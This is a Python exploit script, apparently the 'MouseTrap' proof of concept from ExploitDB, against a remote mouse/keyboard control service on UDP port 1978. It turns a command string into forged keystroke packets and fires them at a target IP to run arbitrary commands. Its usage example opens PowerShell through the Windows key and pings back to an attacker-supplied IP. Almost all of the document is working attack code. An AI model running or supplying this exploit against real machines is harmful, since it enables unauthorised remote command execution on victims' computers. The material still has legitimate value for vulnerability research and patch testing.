'''
# Original Author's Blog : http://axelp.io/MouseTrap
# ExploitDB Version : https://www.exploit-db.com/raw/46697
'''
import argparse
import socket
import enum
import sys
import time
import re

"""
Global Variables
re_keycodes - Compiled regex to extract keycodes from commands
"""
re_keycodes = re.compile(r"(\[.*?\])")

class Keycodes(enum.Enum):
    """
    Enum holding the special character keycode string representations
    """
    ENTER = "RTN"
    BAS = "BAS"
    ALT = "ALT"
    CTRL = "CTRL"
    SHIFT = "SHIFT"
    CMD = "CMD"
    WIN = "WIN"
    TAB = "TAB"
    ESC = "ESC"
    HOME = "HOME"
    INSERT = "INSERT"
    DELETE = "DELETE"
    END = "END"
    PAGE_UP = "PAGE_UP"
    PAGE_DOWN = "PAGE_DOWN"
    BACK = "BACK"
    PAUSE = "PAUSE"
    SPACE = "SPACE"
    UP = "UP"
    DOWN = "DOWN"
    LEFT = "LEFT"
    RIGHT = "RIGHT"
    LWIN = "LWIN"
    RWIN = "RWIN"
    F1 = "F1"
    F2 = "F2"
    F3 = "F3"
    F4 = "F4"
    F5 = "F5"
    F6 = "F6"
    F7 = "F7"
    F8 = "F8"
    F9 = "F9"
    F10 = "F10"
    F11 = "F11"
    F12 = "F12"


def char2pkt(s: str) -> str:
    i = ord(s) ^ 53
    rhs = "[ras]{}".format(i)
    return "key  {}{}".format(len(rhs), rhs)


def special2pkt(kc: Keycodes) -> str:
    return "key  {}{}".format(len(kc.value), kc.value)


def combo2pkt(s: str, kc: Keycodes) -> str:
    if len(s) != 1:
        s = Keycodes[s].value
    if not isinstance(kc, list):
        kc = [kc]
    modifiers = '[*]'+'[*]'.join([k.value for k in kc])
    rhs = "[kld]{}{}".format(s, modifiers)
    return "key {}{}".format(len(rhs), rhs)


def parse_cmd(s: str) -> list:
    pkts = []
    for tok in re.split(re_keycodes, s): # Split the command string into "tokens" (basically text by itself, but things in square brackets in their own element)
        if not (tok.startswith('[') and tok.endswith(']')): # if it's just a plain substring, not a special command
            pkts += [char2pkt(c) for c in tok] # Add the individual character packets
            continue
        
        
        if '+' in tok: # If it's a combo special command
            cmds = tok[1:-1].split('+') # Split the command on the +
            parsed_cmds = [Keycodes[cmd] if cmd in Keycodes.__members__ else cmd for cmd in cmds] # Convert the necessary commands into keycodes
            pkts.append(combo2pkt(parsed_cmds[-1], parsed_cmds[:-1])) # Create the command packet
            continue
        
        pkts.append(special2pkt(Keycodes[tok[1:-1]])) # Otherwise it's an individual command, just convert it and add

    return pkts


def send_exploit(pkts: list, target_ip: str, key: str = '') -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for pkt in pkts:
        time.sleep(0.08)
        sock.sendto(key.encode('utf-8') + pkt.encode('utf-8'), (target_ip, 1978))

def main():
    if len(sys.argv) != 3:
        print("Usage: ./script.py <command> <IP>")
        print("Example: ./script \"[WIN] powershell.exe -c ping <MY_IP> [ENTER]\"")
        exit()
    else:
        evil_packets=parse_cmd(sys.argv[1])
        send_exploit(evil_packets,sys.argv[2])

main()
